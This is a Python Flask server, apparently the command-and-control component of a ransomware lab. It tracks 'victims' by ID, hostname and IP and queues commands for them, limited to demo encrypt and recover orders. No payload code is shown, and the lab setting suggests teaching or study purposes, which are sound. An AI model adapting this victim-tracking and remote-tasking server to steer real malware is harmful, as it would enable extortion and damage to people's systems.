from __future__ import annotations

import json
import os
import re
import threading
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, request

ID_PATTERN = re.compile(r"LAB-[A-F0-9]{6}")
ALLOWED_COMMANDS = frozenset({"CIFRAR_DEMO", "RECUPERAR_DEMO"})


def create_app(database_path: Path | None = None) -> Flask:
    path = database_path or Path(os.environ.get("LAB_DB", r"C:\LAB_RANSOMWARE\Servidor\victimas.json"))
    path.parent.mkdir(parents=True, exist_ok=True)
    lock = threading.Lock()
    pending: dict[str, str] = {}
    app = Flask(__name__)

    def load() -> dict:
        if not path.exists():
            return {}
        return json.loads(path.read_text(encoding="utf-8"))

    def save(value: dict) -> None:
        temporary = path.with_suffix(".tmp")
        temporary.write_text(json.dumps(value, indent=2, ensure_ascii=False), encoding="utf-8")
        temporary.replace(path)

    def valid(victim_id: str | None) -> bool:
        return bool(ID_PATTERN.fullmatch(victim_id or ""))

    @app.get("/estado")
    def state():
        return jsonify(load())

    @app.post("/registro")
    def register():
        payload = request.get_json(silent=True) or {}
        victim_id = payload.get("id")
        if not valid(victim_id):
            return jsonify(ok=False, error="ID invalido"), 400
        with lock:
            db = load()
            old = db.get(victim_id, {})
            db[victim_id] = {
                "id": victim_id,
                "hostname": payload.get("hostname", ""),
                "ip": payload.get("ip", ""),
                "estado": "CONECTADO",
                "ultima_conexion": datetime.now().isoformat(timespec="seconds"),
                "ultimo_resultado": old.get("ultimo_resultado", ""),
            }
            save(db)
        return jsonify(ok=True, comando=pending.pop(victim_id, None))

    @app.post("/poll")
    def poll():
        payload = request.get_json(silent=True) or {}
        victim_id = payload.get("id")
        if not valid(victim_id):
            return jsonify(ok=False, error="ID invalido"), 400
        with lock:
            db = load()
            if victim_id not in db:
                return jsonify(ok=False, error="Victima no registrada"), 404
            db[victim_id]["estado"] = "CONECTADO"
            db[victim_id]["ultima_conexion"] = datetime.now().isoformat(timespec="seconds")
            command = pending.pop(victim_id, None)
            save(db)
        return jsonify(ok=True, comando=command)

    @app.post("/ordenar")
    def order():
        payload = request.get_json(silent=True) or {}
        victim_id, command = payload.get("id"), payload.get("comando")
        if not valid(victim_id):
            return jsonify(ok=False, error="ID invalido"), 400
        if command not in ALLOWED_COMMANDS:
            return jsonify(ok=False, error="Comando no permitido"), 400
        with lock:
            db = load()
            if victim_id not in db:
                return jsonify(ok=False, error="Victima no registrada"), 404
            pending[victim_id] = command
        return jsonify(ok=True, mensaje="Orden puesta en cola")

    @app.post("/resultado")
    def result():
        payload = request.get_json(silent=True) or {}
        victim_id = payload.get("id")
        if not valid(victim_id):
            return jsonify(ok=False, error="ID invalido"), 400
        with lock:
            db = load()
            if victim_id not in db:
                return jsonify(ok=False, error="Victima no registrada"), 404
            db[victim_id].update({
                "estado": payload.get("estado", "FINALIZADO"),
                "ultimo_resultado": payload.get("resultado", ""),
                "ultima_conexion": datetime.now().isoformat(timespec="seconds"),
            })
            save(db)
        return jsonify(ok=True)

    return app


app = create_app()

if __name__ == "__main__":
    app.run(host=os.environ.get("LAB_HOST", "0.0.0.0"), port=int(os.environ.get("LAB_PORT", "5000")))
